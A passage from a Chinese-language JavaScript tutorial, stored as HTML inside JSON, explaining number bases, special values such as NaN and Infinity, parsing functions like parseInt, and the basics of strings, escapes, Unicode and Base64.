language-javascript\"><code>// 小数点后紧跟5个以上的零，\n// 就自动转为科学计数法\n0.0000003 // 3e-7\n\n// 否则，就保持原来的字面形式\n0.000003 // 0.000003</code></pre>\n        <h2>\n            <a href='#数值的进制' class='header-anchor'>#</a>\n            <span>数值的进制</span>\n        </h2>\n    <p>使用字面量（literal）直接表示一个数值时，JavaScript 对整数提供四种进制的表示方法：十进制、十六进制、八进制、二进制。</p>\n<ul>\n<li>十进制：没有前导0的数值。</li>\n<li>八进制：有前缀<code>0o</code>或<code>0O</code>的数值，或者有前导0、且只用到0-7的八个阿拉伯数字的数值。</li>\n<li>十六进制：有前缀<code>0x</code>或<code>0X</code>的数值。</li>\n<li>二进制：有前缀<code>0b</code>或<code>0B</code>的数值。</li>\n</ul>\n<p>默认情况下，JavaScript 内部会自动将八进制、十六进制、二进制转为十进制。下面是一些例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>0xff // 255\n0o377 // 255\n0b11 // 3</code></pre><p>如果八进制、十六进制、二进制的数值里面，出现不属于该进制的数字，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>0xzz // 报错\n0o88 // 报错\n0b22 // 报错</code></pre><p>上面代码中，十六进制出现了字母<code>z</code>、八进制出现数字<code>8</code>、二进制出现数字<code>2</code>，因此报错。</p>\n<p>通常来说，有前导0的数值会被视为八进制，但是如果前导0后面有数字<code>8</code>和<code>9</code>，则该数值被视为十进制。</p>\n<pre class=\"prettyprint language-javascript\"><code>0888 // 888\n0777 // 511</code></pre><p>前导0表示八进制，处理时很容易造成混乱。ES5 的严格模式和 ES6，已经废除了这种表示法，但是浏览器为了兼容以前的代码，目前还继续支持这种表示法。</p>\n\n        <h2>\n            <a href='#特殊数值' class='header-anchor'>#</a>\n            <span>特殊数值</span>\n        </h2>\n    <p>JavaScript 提供了几个特殊的数值。</p>\n\n        <h3>\n            <a href='#正零和负零' class='header-anchor'>#</a>\n            <span>正零和负零</span>\n        </h3>\n    <p>前面说过，JavaScript 的64位浮点数之中，有一个二进制位是符号位。这意味着，任何一个数都有一个对应的负值，就连<code>0</code>也不例外。</p>\n<p>JavaScript 内部实际上存在2个<code>0</code>：一个是<code>+0</code>，一个是<code>-0</code>，区别就是64位浮点数表示法的符号位不同。它们是等价的。</p>\n<pre class=\"prettyprint language-javascript\"><code>-0 === +0 // true\n0 === -0 // true\n0 === +0 // true</code></pre><p>几乎所有场合，正零和负零都会被当作正常的<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>+0 // 0\n-0 // 0\n(-0).toString() // &#039;0&#039;\n(+0).toString() // &#039;0&#039;</code></pre><p>唯一有区别的场合是，<code>+0</code>或<code>-0</code>当作分母，返回的值是不相等的。</p>\n<pre class=\"prettyprint language-javascript\"><code>(1 / +0) === (1 / -0) // false</code></pre><p>上面的代码之所以出现这样结果，是因为除以正零得到<code>+Infinity</code>，除以负零得到<code>-Infinity</code>，这两者是不相等的（关于<code>Infinity</code>详见下文）。</p>\n\n        <h3>\n            <a href='#NaN' class='header-anchor'>#</a>\n            <span>NaN</span>\n        </h3>\n    <p><strong>（1）含义</strong></p>\n<p><code>NaN</code>是 JavaScript 的特殊值，表示“非数字”（Not a Number），主要出现在将字符串解析成数字出错的场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 - &#039;x&#039; // NaN</code></pre><p>上面代码运行时，会自动将字符串<code>x</code>转为数值，但是由于<code>x</code>不是数值，所以最后得到结果为<code>NaN</code>，表示它是“非数字”（<code>NaN</code>）。</p>\n<p>另外，一些数学函数的运算结果会出现<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.acos(2) // NaN\nMath.log(-1) // NaN\nMath.sqrt(-1) // NaN</code></pre><p><code>0</code>除以<code>0</code>也会得到<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 / 0 // NaN</code></pre><p>需要注意的是，<code>NaN</code>不是独立的数据类型，而是一个特殊数值，它的数据类型依然属于<code>Number</code>，使用<code>typeof</code>运算符可以看得很清楚。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof NaN // &#039;number&#039;</code></pre><p><strong>（2）运算规则</strong></p>\n<p><code>NaN</code>不等于任何值，包括它本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN === NaN // false</code></pre><p>数组的<code>indexOf</code>方法内部使用的是严格相等运算符，所以该方法对<code>NaN</code>不成立。</p>\n<pre class=\"prettyprint language-javascript\"><code>[NaN].indexOf(NaN) // -1</code></pre><p><code>NaN</code>在布尔运算时被当作<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(NaN) // false</code></pre><p><code>NaN</code>与任何数（包括它自己）的运算，得到的都是<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN + 32 // NaN\nNaN - 32 // NaN\nNaN * 32 // NaN\nNaN / 32 // NaN</code></pre>\n        <h3>\n            <a href='#Infinity' class='header-anchor'>#</a>\n            <span>Infinity</span>\n        </h3>\n    <p><strong>（1）含义</strong></p>\n<p><code>Infinity</code>表示“无穷”，用来表示两种场景。一种是一个正的数值太大，或一个负的数值太小，无法表示；另一种是非0数值除以0，得到<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 场景一\nMath.pow(2, 1024)\n// Infinity\n\n// 场景二\n0 / 0 // NaN\n1 / 0 // Infinity</code></pre><p>上面代码中，第一个场景是一个表达式的计算结果太大，超出了能够表示的范围，因此返回<code>Infinity</code>。第二个场景是<code>0</code>除以<code>0</code>会得到<code>NaN</code>，而非0数值除以<code>0</code>，会返回<code>Infinity</code>。</p>\n<p><code>Infinity</code>有正负之分，<code>Infinity</code>表示正的无穷，<code>-Infinity</code>表示负的无穷。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity === -Infinity // false\n\n1 / -0 // -Infinity\n-1 / -0 // Infinity</code></pre><p>上面代码中，非零正数除以<code>-0</code>，会得到<code>-Infinity</code>，负数除以<code>-0</code>，会得到<code>Infinity</code>。</p>\n<p>由于数值正向溢出（overflow）、负向溢出（underflow）和被<code>0</code>除，JavaScript 都不报错，而是返回<code>Infinity</code>，所以单纯的数学运算几乎没有可能抛出错误。</p>\n<p><code>Infinity</code>大于一切数值（除了<code>NaN</code>），<code>-Infinity</code>小于一切数值（除了<code>NaN</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity &gt; 1000 // true\n-Infinity &lt; -1000 // true</code></pre><p><code>Infinity</code>与<code>NaN</code>比较，总是返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity &gt; NaN // false\n-Infinity &gt; NaN // false\n\nInfinity &lt; NaN // false\n-Infinity &lt; NaN // false</code></pre><p><strong>（2）运算规则</strong></p>\n<p><code>Infinity</code>的四则运算，符合无穷的数学计算规则。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 * Infinity // Infinity\n5 - Infinity // -Infinity\nInfinity / 5 // Infinity\n5 / Infinity // 0</code></pre><p>0乘以<code>Infinity</code>，返回<code>NaN</code>；0除以<code>Infinity</code>，返回<code>0</code>；<code>Infinity</code>除以0，返回<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 * Infinity // NaN\n0 / Infinity // 0\nInfinity / 0 // Infinity</code></pre><p><code>Infinity</code>加上或乘以<code>Infinity</code>，返回的还是<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity + Infinity // Infinity\nInfinity * Infinity // Infinity</code></pre><p><code>Infinity</code>减去或除以<code>Infinity</code>，得到<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity - Infinity // NaN\nInfinity / Infinity // NaN</code></pre><p><code>Infinity</code>与<code>null</code>计算时，<code>null</code>会转成0，等同于与<code>0</code>的计算。</p>\n<pre class=\"prettyprint language-javascript\"><code>null * Infinity // NaN\nnull / Infinity // 0\nInfinity / null // Infinity</code></pre><p><code>Infinity</code>与<code>undefined</code>计算，返回的都是<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>undefined + Infinity // NaN\nundefined - Infinity // NaN\nundefined * Infinity // NaN\nundefined / Infinity // NaN\nInfinity / undefined // NaN</code></pre>\n        <h2>\n            <a href='#与数值相关的全局方法' class='header-anchor'>#</a>\n            <span>与数值相关的全局方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#parseInt()' class='header-anchor'>#</a>\n            <span>parseInt()</span>\n        </h3>\n    <p><strong>（1）基本用法</strong></p>\n<p><code>parseInt</code>方法用于将字符串转为整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;123&#039;) // 123</code></pre><p>如果字符串头部有空格，空格会被自动去除。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;   81&#039;) // 81</code></pre><p>如果<code>parseInt</code>的参数不是字符串，则会先转为字符串再转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(1.23) // 1\n// 等同于\nparseInt(&#039;1.23&#039;) // 1</code></pre><p>字符串转为整数的时候，是一个个字符依次转换，如果遇到不能转为数字的字符，就不再进行下去，返回已经转好的部分。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;8a&#039;) // 8\nparseInt(&#039;12**&#039;) // 12\nparseInt(&#039;12.34&#039;) // 12\nparseInt(&#039;15e2&#039;) // 15\nparseInt(&#039;15px&#039;) // 15</code></pre><p>上面代码中，<code>parseInt</code>的参数都是字符串，结果只返回字符串头部可以转为数字的部分。</p>\n<p>如果字符串的第一个字符不能转化为数字（后面跟着数字的正负号除外），返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;abc&#039;) // NaN\nparseInt(&#039;.3&#039;) // NaN\nparseInt(&#039;&#039;) // NaN\nparseInt(&#039;+&#039;) // NaN\nparseInt(&#039;+1&#039;) // 1</code></pre><p>所以，<code>parseInt</code>的返回值只有两种可能，要么是一个十进制整数，要么是<code>NaN</code>。</p>\n<p>如果字符串以<code>0x</code>或<code>0X</code>开头，<code>parseInt</code>会将其按照十六进制数解析。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;0x10&#039;) // 16</code></pre><p>如果字符串以<code>0</code>开头，将其按照10进制解析。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;011&#039;) // 11</code></pre><p>对于那些会自动转为科学计数法的数字，<code>parseInt</code>会将科学计数法的表示方法视为字符串，因此导致一些奇怪的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(1000000000000000000000.5) // 1\n// 等同于\nparseInt(&#039;1e+21&#039;) // 1\n\nparseInt(0.0000008) // 8\n// 等同于\nparseInt(&#039;8e-7&#039;) // 8</code></pre><p><strong>（2）进制转换</strong></p>\n<p><code>parseInt</code>方法还可以接受第二个参数（2到36之间），表示被解析的值的进制，返回该值对应的十进制数。默认情况下，<code>parseInt</code>的第二个参数为10，即默认是十进制转十进制。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1000&#039;) // 1000\n// 等同于\nparseInt(&#039;1000&#039;, 10) // 1000</code></pre><p>下面是转换指定进制的数的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1000&#039;, 2) // 8\nparseInt(&#039;1000&#039;, 6) // 216\nparseInt(&#039;1000&#039;, 8) // 512</code></pre><p>上面代码中，二进制、六进制、八进制的<code>1000</code>，分别等于十进制的8、216和512。这意味着，可以用<code>parseInt</code>方法进行进制的转换。</p>\n<p>如果第二个参数不是数值，会被自动转为一个整数。这个整数只有在2到36之间，才能得到有意义的结果，超出这个范围，则返回<code>NaN</code>。如果第二个参数是<code>0</code>、<code>undefined</code>和<code>null</code>，则直接忽略。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;10&#039;, 37) // NaN\nparseInt(&#039;10&#039;, 1) // NaN\nparseInt(&#039;10&#039;, 0) // 10\nparseInt(&#039;10&#039;, null) // 10\nparseInt(&#039;10&#039;, undefined) // 10</code></pre><p>如果字符串包含对于指定进制无意义的字符，则从最高位开始，只返回可以转换的数值。如果最高位无法转换，则直接返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1546&#039;, 2) // 1\nparseInt(&#039;546&#039;, 2) // NaN</code></pre><p>上面代码中，对于二进制来说，<code>1</code>是有意义的字符，<code>5</code>、<code>4</code>、<code>6</code>都是无意义的字符，所以第一行返回1，第二行返回<code>NaN</code>。</p>\n<p>前面说过，如果<code>parseInt</code>的第一个参数不是字符串，会被先转为字符串。这会导致一些令人意外的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(0x11, 36) // 43\nparseInt(0x11, 2) // 1\n\n// 等同于\nparseInt(String(0x11), 36)\nparseInt(String(0x11), 2)\n\n// 等同于\nparseInt(&#039;17&#039;, 36)\nparseInt(&#039;17&#039;, 2)</code></pre><p>上面代码中，十六进制的<code>0x11</code>会被先转为十进制的17，再转为字符串。然后，再用36进制或二进制解读字符串<code>17</code>，最后返回结果<code>43</code>和<code>1</code>。</p>\n<p>这种处理方式，对于八进制的前缀0，尤其需要注意。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(011, 2) // NaN\n\n// 等同于\nparseInt(String(011), 2)\n\n// 等同于\nparseInt(String(9), 2)</code></pre><p>上面代码中，第一行的<code>011</code>会被先转为字符串<code>9</code>，因为<code>9</code>不是二进制的有效字符，所以返回<code>NaN</code>。如果直接计算<code>parseInt(&#39;011&#39;, 2)</code>，<code>011</code>则是会被当作二进制处理，返回3。</p>\n<p>JavaScript 不再允许将带有前缀0的数字视为八进制数，而是要求忽略这个<code>0</code>。但是，为了保证兼容性，大部分浏览器并没有部署这一条规定。</p>\n\n        <h3>\n            <a href='#parseFloat()' class='header-anchor'>#</a>\n            <span>parseFloat()</span>\n        </h3>\n    <p><code>parseFloat</code>方法用于将一个字符串转为浮点数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;3.14&#039;) // 3.14</code></pre><p>如果字符串符合科学计数法，则会进行相应的转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;314e-2&#039;) // 3.14\nparseFloat(&#039;0.0314E+2&#039;) // 3.14</code></pre><p>如果字符串包含不能转为浮点数的字符，则不再进行往后转换，返回已经转好的部分。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;3.14more non-digit characters&#039;) // 3.14</code></pre><p><code>parseFloat</code>方法会自动过滤字符串前导的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;\\t\\v\\r12.34\\n &#039;) // 12.34</code></pre><p>如果参数不是字符串，或者字符串的第一个字符不能转化为浮点数，则返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat([]) // NaN\nparseFloat(&#039;FF2&#039;) // NaN\nparseFloat(&#039;&#039;) // NaN</code></pre><p>上面代码中，尤其值得注意，<code>parseFloat</code>会将空字符串转为<code>NaN</code>。</p>\n<p>这些特点使得<code>parseFloat</code>的转换结果不同于<code>Number</code>函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(true)  // NaN\nNumber(true) // 1\n\nparseFloat(null) // NaN\nNumber(null) // 0\n\nparseFloat(&#039;&#039;) // NaN\nNumber(&#039;&#039;) // 0\n\nparseFloat(&#039;123.45#&#039;) // 123.45\nNumber(&#039;123.45#&#039;) // NaN</code></pre>\n        <h3>\n            <a href='#isNaN()' class='header-anchor'>#</a>\n            <span>isNaN()</span>\n        </h3>\n    <p><code>isNaN</code>方法可以用来判断一个值是否为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN(NaN) // true\nisNaN(123) // false</code></pre><p>但是，<code>isNaN</code>只对数值有效，如果传入其他值，会被先转成数值。比如，传入字符串的时候，字符串会被先转成<code>NaN</code>，所以最后返回<code>true</code>，这一点要特别引起注意。也就是说，<code>isNaN</code>为<code>true</code>的值，有可能不是<code>NaN</code>，而是一个字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN(&#039;Hello&#039;) // true\n// 相当于\nisNaN(Number(&#039;Hello&#039;)) // true</code></pre><p>出于同样的原因，对于对象和数组，<code>isNaN</code>也返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN({}) // true\n// 等同于\nisNaN(Number({})) // true\n\nisNaN([&#039;xzy&#039;]) // true\n// 等同于\nisNaN(Number([&#039;xzy&#039;])) // true</code></pre><p>但是，对于空数组和只有一个数值成员的数组，<code>isNaN</code>返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN([]) // false\nisNaN([123]) // false\nisNaN([&#039;123&#039;]) // false</code></pre><p>上面代码之所以返回<code>false</code>，原因是这些数组能被<code>Number</code>函数转成数值，请参见《数据类型转换》一章。</p>\n<p>因此，使用<code>isNaN</code>之前，最好判断一下数据类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>function myIsNaN(value) {\n  return typeof value === &#039;number&#039; &amp;&amp; isNaN(value);\n}</code></pre><p>判断<code>NaN</code>更可靠的方法是，利用<code>NaN</code>为唯一不等于自身的值的这个特点，进行判断。</p>\n<pre class=\"prettyprint language-javascript\"><code>function myIsNaN(value) {\n  return value !== value;\n}</code></pre>\n        <h3>\n            <a href='#isFinite()' class='header-anchor'>#</a>\n            <span>isFinite()</span>\n        </h3>\n    <p><code>isFinite</code>方法返回一个布尔值，表示某个值是否为正常的数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>isFinite(Infinity) // false\nisFinite(-Infinity) // false\nisFinite(NaN) // false\nisFinite(undefined) // false\nisFinite(null) // true\nisFinite(-1) // true</code></pre><p>除了<code>Infinity</code>、<code>-Infinity</code>、<code>NaN</code>和<code>undefined</code>这几个值会返回<code>false</code>，<code>isFinite</code>对于其他的数值都会返回<code>true</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/04/number-encoding.html\">How numbers are encoded in JavaScript</a></li>\n<li>Humphry, <a href=\"http://blog.segmentfault.com/humphry/1190000000407658\">JavaScript 中 Number 的一些表示上/下限</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"字符串","link":"/types/string.html"}],"content":"\n        <h1>\n            <a href='#字符串' class='header-anchor'>#</a>\n            <span>字符串</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h3>\n    <p>字符串就是零个或多个排在一起的字符，放在单引号或双引号之中。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;\n&quot;abc&quot;</code></pre><p>单引号字符串的内部，可以使用双引号。双引号字符串的内部，可以使用单引号。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;key = &quot;value&quot;&#039;\n&quot;It&#039;s a long journey&quot;</code></pre><p>上面两个都是合法的字符串。</p>\n<p>如果要在单引号字符串的内部，使用单引号，就必须在内部的单引号前面加上反斜杠，用来转义。双引号字符串内部使用双引号，也是如此。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Did she say \\&#039;Hello\\&#039;?&#039;\n// &quot;Did she say &#039;Hello&#039;?&quot;\n\n&quot;Did she say \\&quot;Hello\\&quot;?&quot;\n// &quot;Did she say &quot;Hello&quot;?&quot;</code></pre><p>由于 HTML 语言的属性值使用双引号，所以很多项目约定 JavaScript 语言的字符串只使用单引号，本教程遵守这个约定。当然，只使用双引号也完全可以。重要的是坚持使用一种风格，不要一会使用单引号表示字符串，一会又使用双引号表示。</p>\n<p>字符串默认只能写在一行内，分成多行将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a\nb\nc&#039;\n// SyntaxError: Unexpected token ILLEGAL</code></pre><p>上面代码将一个字符串分成三行，JavaScript 就会报错。</p>\n<p>如果长字符串必须分成多行，可以在每一行的尾部使用反斜杠。</p>\n<pre class=\"prettyprint language-javascript\"><code>var longString = &#039;Long \\\nlong \\\nlong \\\nstring&#039;;\n\nlongString\n// &quot;Long long long string&quot;</code></pre><p>上面代码表示，加了反斜杠以后，原来写在一行的字符串，可以分成多行书写。但是，输出的时候还是单行，效果与写在同一行完全一样。注意，反斜杠的后面必须是换行符，而不能有其他字符（比如空格），否则会报错。</p>\n<p>连接运算符（<code>+</code>）可以连接多个单行字符串，将长字符串拆成多行书写，输出的时候也是单行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var longString = &#039;Long &#039;\n  + &#039;long &#039;\n  + &#039;long &#039;\n  + &#039;string&#039;;</code></pre><p>如果想输出多行字符串，有一种利用多行注释的变通方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function () { /*\nline 1\nline 2\nline 3\n*/}).toString().split(&#039;\\n&#039;).slice(1, -1).join(&#039;\\n&#039;)\n// &quot;line 1\n// line 2\n// line 3&quot;</code></pre><p>上面的例子中，输出的字符串就是多行。</p>\n\n        <h3>\n            <a href='#转义' class='header-anchor'>#</a>\n            <span>转义</span>\n        </h3>\n    <p>反斜杠（\\）在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义符。</p>\n<p>需要用反斜杠转义的特殊字符，主要有下面这些。</p>\n<ul>\n<li><code>\\0</code> ：null（<code>\\u0000</code>）</li>\n<li><code>\\b</code> ：后退键（<code>\\u0008</code>）</li>\n<li><code>\\f</code> ：换页符（<code>\\u000C</code>）</li>\n<li><code>\\n</code> ：换行符（<code>\\u000A</code>）</li>\n<li><code>\\r</code> ：回车键（<code>\\u000D</code>）</li>\n<li><code>\\t</code> ：制表符（<code>\\u0009</code>）</li>\n<li><code>\\v</code> ：垂直制表符（<code>\\u000B</code>）</li>\n<li><code>\\&#39;</code> ：单引号（<code>\\u0027</code>）</li>\n<li><code>\\&quot;</code> ：双引号（<code>\\u0022</code>）</li>\n<li><code>\\\\</code> ：反斜杠（<code>\\u005C</code>）</li>\n</ul>\n<p>上面这些字符前面加上反斜杠，都表示特殊含义。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039;1\\n2&#039;)\n// 1\n// 2</code></pre><p>上面代码中，<code>\\n</code>表示换行，输出的时候就分成了两行。</p>\n<p>反斜杠还有三种特殊用法。</p>\n<p>（1）<code>\\HHH</code></p>\n<p>反斜杠后面紧跟三个八进制数（<code>000</code>到<code>377</code>），代表一个字符。<code>HHH</code>对应该字符的 Unicode 码点，比如<code>\\251</code>表示版权符号。显然，这种方法只能输出256种字符。</p>\n<p>（2）<code>\\xHH</code></p>\n<p><code>\\x</code>后面紧跟两个十六进制数（<code>00</code>到<code>FF</code>），代表一个字符。<code>HH</code>对应该字符的 Unicode 码点，比如<code>\\xA9</code>表示版权符号。这种方法也只能输出256种字符。</p>\n<p>（3）<code>\\uXXXX</code></p>\n<p><code>\\u</code>后面紧跟四个十六进制数（<code>0000</code>到<code>FFFF</code>），代表一个字符。<code>XXXX</code>对应该字符的 Unicode 码点，比如<code>\\u00A9</code>表示版权符号。</p>\n<p>下面是这三种字符特殊写法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\251&#039; // &quot;©&quot;\n&#039;\\xA9&#039; // &quot;©&quot;\n&#039;\\u00A9&#039; // &quot;©&quot;\n\n&#039;\\172&#039; === &#039;z&#039; // true\n&#039;\\x7A&#039; === &#039;z&#039; // true\n&#039;\\u007A&#039; === &#039;z&#039; // true</code></pre><p>如果在非特殊字符前面使用反斜杠，则反斜杠会被省略。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\a&#039;\n// &quot;a&quot;</code></pre><p>上面代码中，<code>a</code>是一个正常字符，前面加反斜杠没有特殊含义，反斜杠会被自动省略。</p>\n<p>如果字符串的正常内容之中，需要包含反斜杠，则反斜杠前面需要再加一个反斜杠，用来对自身转义。</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;Prev \\\\ Next&quot;\n// &quot;Prev \\ Next&quot;</code></pre>\n        <h3>\n            <a href='#字符串与数组' class='header-anchor'>#</a>\n            <span>字符串与数组</span>\n        </h3>\n    <p>字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符（位置编号从0开始）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\ns[0] // &quot;h&quot;\ns[1] // &quot;e&quot;\ns[4] // &quot;o&quot;\n\n// 直接对字符串使用方括号运算符\n&#039;hello&#039;[1] // &quot;e&quot;</code></pre><p>如果方括号中的数字超过字符串的长度，或者方括号中根本不是数字，则返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;[3] // undefined\n&#039;abc&#039;[-1] // undefined\n&#039;abc&#039;[&#039;x&#039;] // undefined</code></pre><p>但是，字符串与数组的相似性仅此而已。实际上，无法改变字符串之中的单个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\n\ndelete s[0];\ns // &quot;hello&quot;\n\ns[1] = &#039;a&#039;;\ns // &quot;hello&quot;\n\ns[5] = &#039;!&#039;;\ns // &quot;hello&quot;</code></pre><p>上面代码表示，字符串内部的单个字符无法改变和增删，这些操作会默默地失败。</p>\n\n        <h3>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h3>\n    <p><code>length</code>属性返回字符串的长度，该属性也是无法改变的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\ns.length // 5\n\ns.length = 3;\ns.length // 5\n\ns.length = 7;\ns.length // 5</code></pre><p>上面代码表示字符串的<code>length</code>属性无法改变，但是不会报错。</p>\n\n        <h2>\n            <a href='#字符集' class='header-anchor'>#</a>\n            <span>字符集</span>\n        </h2>\n    <p>JavaScript 使用 Unicode 字符集。JavaScript 引擎内部，所有字符都用 Unicode 表示。</p>\n<p>JavaScript 不仅以 Unicode 储存字符，还允许直接在程序中使用 Unicode 码点表示字符，即将字符写成<code>\\uxxxx</code>的形式，其中<code>xxxx</code>代表该字符的 Unicode 码点。比如，<code>\\u00A9</code>代表版权符号。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;\\u00A9&#039;;\ns // &quot;©&quot;</code></pre><p>解析代码的时候，JavaScript 会自动识别一个字符是字面形式表示，还是 Unicode 形式表示。输出给用户的时候，所有字符都会转成字面形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f\\u006F\\u006F = &#039;abc&#039;;\nfoo // &quot;abc&quot;</code></pre><p>上面代码中，第一行的变量名<code>foo</code>是 Unicode 形式表示，第二行是字面形式表示。JavaScript 会自动识别。</p>\n<p>我们还需要知道，每个字符在 JavaScript 内部都是以16位（即2个字节）的 UTF-16 格式储存。也就是说，JavaScript 的单位字符长度固定为16位长度，即2个字节。</p>\n<p>但是，UTF-16 有两种长度：对于码点在<code>U+0000</code>到<code>U+FFFF</code>之间的字符，长度为16位（即2个字节）；对于码点在<code>U+10000</code>到<code>U+10FFFF</code>之间的字符，长度为32位（即4个字节），而且前两个字节在<code>0xD800</code>到<code>0xDBFF</code>之间，后两个字节在<code>0xDC00</code>到<code>0xDFFF</code>之间。举例来说，码点<code>U+1D306</code>对应的字符为<code>𝌆，</code>它写成 UTF-16 就是<code>0xD834 0xDF06</code>。</p>\n<p>JavaScript 对 UTF-16 的支持是不完整的，由于历史原因，只支持两字节的字符，不支持四字节的字符。这是因为 JavaScript 第一版发布的时候，Unicode 的码点只编到<code>U+FFFF</code>，因此两字节足够表示了。后来，Unicode 纳入的字符越来越多，出现了四字节的编码。但是，JavaScript 的标准此时已经定型了，统一将字符长度限制在两字节，导致无法识别四字节的字符。上一节的那个四字节字符<code>𝌆</code>，浏览器会正确识别这是一个字符，但是 JavaScript 无法识别，会认为这是两个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;𝌆&#039;.length // 2</code></pre><p>上面代码中，JavaScript 认为<code>𝌆</code>的长度为2，而不是1。</p>\n<p>总结一下，对于码点在<code>U+10000</code>到<code>U+10FFFF</code>之间的字符，JavaScript 总是认为它们是两个字符（<code>length</code>属性为2）。所以处理的时候，必须把这一点考虑在内，也就是说，JavaScript 返回的字符串长度可能是不正确的。</p>\n\n        <h2>\n            <a href='#Base64-转码' class='header-anchor'>#</a>\n            <span>Base64 转码</span>\n        </h2>\n    <p>有时，文本里面包含一些不可打印的符号，比如 ASCII 码0到31的符号都无法打印出来，这时可以使用 Base64 编码，将它们转成可以打印的字符。另一个场景是，有时需要以文本格式传递二进制数据，那么也可以使用 Base64 编码。</p>\n<p>所谓 Base64 就是一种编码方法，可以将任意值转成 0～9、A～Z、a-z、<code>+</code>和<code>/</code>这64个字符组成的可打印字符。使用它的主要目的，不是为了加密，而是为了不出现特殊字符，简化程序的处理。</p>\n<p>JavaScript 原生提供两个 Base64 相关的方法。</p>\n<ul>\n<li><code>btoa()</code>：任意值转为 Base64 编码</li>\n<li><code>atob()</code>：Base64 编码转为原来的值</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var string = &#039;Hello World!&#039;;\nbtoa(string) // &quot;SGVsbG8gV29ybGQh&quot;\natob(&#039;SGVsbG8gV29ybGQh&#039;) // &quot;Hello World!&quot;</code></pre><p>注意，这两个方法不适合非 ASCII 码的字符，会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>btoa(&#039;你好&#039;) // 报错</code></pre><p>要将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节，再使用这两个方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function 